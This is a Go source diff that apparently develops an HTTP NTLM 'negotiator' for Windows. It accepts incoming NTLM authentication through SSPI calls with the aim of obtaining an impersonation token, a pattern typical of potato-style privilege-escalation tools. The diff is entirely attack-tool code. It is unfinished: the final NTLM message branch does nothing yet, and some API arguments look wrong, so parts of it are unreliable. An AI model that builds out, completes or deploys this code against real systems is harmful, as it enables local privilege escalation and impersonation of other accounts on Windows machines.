@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"net/http"
 	"strconv"
+	"syscall"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -16,35 +17,46 @@ const (
 )
 
 type _SecHandle struct {
-	dwLower uint64
-	dwUpper uint64
+	dwLower uintptr
+	dwUpper uintptr
 }
 
 type SecHandle _SecHandle
-type PSecHandle *_SecHandle
 type CredHandle SecHandle
-type PCredHandle PSecHandle
 type CtxtHandle SecHandle
-type PCtxtHandle PSecHandle
+
+type _SecBufferDesc struct {
+	ulVersion uint32
+	cBuffers  uint32
+	pBuffers  *SecBuffer
+}
+
+type SecBufferDesc _SecBufferDesc
+
+type _SecBuffer struct {
+	cbBuffer   uint32
+	BufferType uint32
+	pvBuffer   uintptr
+}
+
+type SecBuffer _SecBuffer
 
 type SECURITY_INTEGER struct {
-	LowPart  uint64
-	HighPart int64
+	LowPart  uint32
+	HighPart int32
 }
 
 type TimeStamp SECURITY_INTEGER
-type PTimeStamp *SECURITY_INTEGER
-
-type HTTPNTLMNegotiatorResult struct {
-	ImpersonationToken *windows.Token
-	Error              error
-}
 
 type HTTPNTLMNegotiator struct {
-	Host  string
-	Port  int
-	Chan  chan HTTPNTLMNegotiatorResult
-	HCred CredHandle
+	Host                string
+	Port                int
+	Chan                chan NegotiatorResult
+	HCred               CredHandle
+	secClientBufferDesc SecBufferDesc
+	secServerBufferDesc SecBufferDesc
+	secClientBuffer     SecBuffer
+	secServerBuffer     SecBuffer
 }
 
 func (negotiator HTTPNTLMNegotiator) Serve() (*windows.Token, error) {
@@ -91,20 +103,68 @@ func (negotiator *HTTPNTLMNegotiator) ServeHTTP(res http.ResponseWriter, req *ht
 			res.WriteHeader(http.StatusOK)
 			fmt.Println("[+] " + req.RemoteAddr + " authenticated")
 		}
-		negotiator.HandleNTLM(ntlmBytes, messageType)
+
+		err := negotiator.HandleNTLM(ntlmBytes, messageType)
+
+		if err != nil {
+			fmt.Println(err)
+		}
 	}
 	//negotiator.Chan <- HTTPNTLMNegotiatorResult{nil, nil}
 }
 
-func (negotiator *HTTPNTLMNegotiator) HandleNTLM(ntlmBytes []byte, msgType byte) {
+func (negotiator *HTTPNTLMNegotiator) HandleNTLM(ntlmBytes []byte, msgType byte) error {
 	switch msgType {
 	case 1:
-		timeStamp := TimeStamp{}
-		_, _, err := acquireCredentialsHandle.Call(0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Negotiate"))), SECPKG_CRED_INBOUND, 0, 0, 0, 0, uintptr(unsafe.Pointer(&negotiator.HCred)), uintptr(unsafe.Pointer(&timeStamp)))
+		ptsExpiry := TimeStamp{}
+		_, _, err := acquireCredentialsHandle.Call(0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Negotiate"))), SECPKG_CRED_INBOUND, 0, 0, 0, 0, uintptr(unsafe.Pointer(&negotiator.HCred)), uintptr(unsafe.Pointer(&ptsExpiry)))
 
-		fmt.Println(err)
+		if err != syscall.Errno(0) {
+			fmt.Println("[!] Failed to acquire credential handle")
+			return err
+		}
+
+		InitTokenContextBuffer(&negotiator.secClientBufferDesc, &negotiator.secClientBuffer)
+		InitTokenContextBuffer(&negotiator.secServerBufferDesc, &negotiator.secServerBuffer)
+
+		var phContext windows.Handle
+		var fContextAttr uint32
+		var tsContextExpiry TimeStamp
+
+		negotiator.secClientBuffer.cbBuffer = uint32(len(ntlmBytes))
+		negotiator.secClientBuffer.pvBuffer = uintptr(unsafe.Pointer(&ntlmBytes[0]))
+
+		_, _, err = acceptSecurityContext.Call(
+			uintptr(unsafe.Pointer(&negotiator.HCred)),
+			0,
+			uintptr(unsafe.Pointer(&negotiator.secClientBufferDesc)),
+			ASC_REQ_ALLOCATE_MEMORY|ASC_REQ_CONNECTION,
+			SECURITY_NATIVE_DREP,
+			uintptr(phContext),
+			uintptr(unsafe.Pointer(&negotiator.secServerBufferDesc)),
+			uintptr(unsafe.Pointer(&fContextAttr)),
+			uintptr(unsafe.Pointer(&tsContextExpiry)),
+		)
+
+		if err != syscall.Errno(0) {
+			fmt.Println("[!] Error accepting security context")
+			return err
+		}
 	case 3:
+		InitTokenContextBuffer(&negotiator.secClientBufferDesc, &negotiator.secClientBuffer)
+		InitTokenContextBuffer(&negotiator.secServerBufferDesc, &negotiator.secServerBuffer)
 	}
+
+	return nil
+}
+
+func InitTokenContextBuffer(pSecBufferDesc *SecBufferDesc, pSecBuffer *SecBuffer) {
+	pSecBuffer.BufferType = SECBUFFER_TOKEN
+	pSecBuffer.cbBuffer = 0
+	pSecBuffer.pvBuffer = 0
+	pSecBufferDesc.ulVersion = SECBUFFER_VERSION
+	pSecBufferDesc.cBuffers = 1
+	pSecBufferDesc.pBuffers = pSecBuffer
 }
 
 func ParseNTLM(bytes []byte) int {
